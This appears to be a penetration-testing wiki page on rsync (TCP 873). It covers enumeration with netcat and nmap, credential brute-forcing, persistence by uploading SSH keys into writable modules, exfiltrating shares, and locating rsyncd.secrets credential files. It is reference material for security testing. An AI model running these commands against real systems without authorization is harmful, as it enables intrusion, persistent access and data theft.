---
description: Ports TCP 873
---

# Rsync

## Theory

**Rsync** is a utility for efficiently [transferring](https://en.wikipedia.org/wiki/File\_transfer) and [synchronizing](https://en.wikipedia.org/wiki/File\_synchronization) [files](https://en.wikipedia.org/wiki/Computer\_file) between a computer and an external hard drive and across network. By default it run on port TCP 873

## Practice

### Enumeration

{% tabs %}
{% tab title="Connect to Rsync" %}
To initiate a connection with an rsync server, use the [rsync](https://rsync.samba.org/) command followed by the rsync URL.

```bash
# The URL format is `[rsync://][user@]host[:port]/module.``
rsync rsync://user@target_host/
```
{% endtab %}

{% tab title="Banner Grabbing" %}
You can use `Netcat` to find out what service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.

```bash
nc -nv <IP> 873

# Expected output format
@RSYNCD: version
```
{% endtab %}

{% tab title="Modules" %}
You can use `Nmap` to check if there's an Rsync server on a target host like this:

```bash
nmap -p 873 <IP>
```

We can then **enumerate modules**. Thus is a crucial enumeration phase to understand the structure of the target rsync module and finding misconfigurations or sensitive information.

```bash
nmap -sV --script "rsync-list-modules" -p 873 target_host
```
{% endtab %}

{% tab title="Shared Folders" %}
Rsync modules represent directory shares and may be protected with a password. To list these modules:

```bash
rsync target_host::
```

For detailed enumeration of a specific module to see files and permissions:

```bash
rsync -av --list-only rsync://target_host/module_name
```
{% endtab %}
{% endtabs %}

### Exploiting

{% tabs %}
{% tab title="Bruteforce" %}
Be aware that some shares might be restricted to specific **credentials**, indicated by an **"Access Denied"** message. We can try to bruteforce the password using following command.

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
{% endtab %}

{% tab title="Misconfigured Modules" %}
Modules without proper authentication can be accessed by unauthorized users. This vulnerability allows attackers to read, modify, or delete sensitive data.

If a module is writable, and you have determined its path through enumeration, you can upload malicious files, potentially leading to remote command execution or pivoting into the network.
{% endtab %}
{% endtabs %}

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

{% tabs %}
{% tab title="Persistence" %}
Upload artifacts like modified scripts or binaries to maintain access:

```bash
rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
```
{% endtab %}

{% tab title="Data Exfiltration" %}
Sensitive data identified during enumeration can be exfiltrated using rsync:

#### From Remote to Local&#x20;

We can sync a remote folder with a local folder.

```bash
rsync -avz rsync://<IP>:873/share_name /local/directory/
# OR
rsync -avz <IP>::share_name /local/directory/
```

#### From Local to Remote\*

We can sync our local folder with a remote folder.

```bash
rsync -av /local/directory/ <IP>::share_name
# OR
rsync -av /local/directory/ rsync://<IP>:873/share_name 
```
{% endtab %}

{% tab title="rsyncd.conf" %}
To locate the `rsyncd` configuration file and potentially find a secrets file containing usernames and passwords for `rsyncd` authentication, use the following command:

```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://hackviser.com/tactics/pentesting/services/rsync" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync" %}
\*
{% endembed %}

{% embed url="https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/" %}
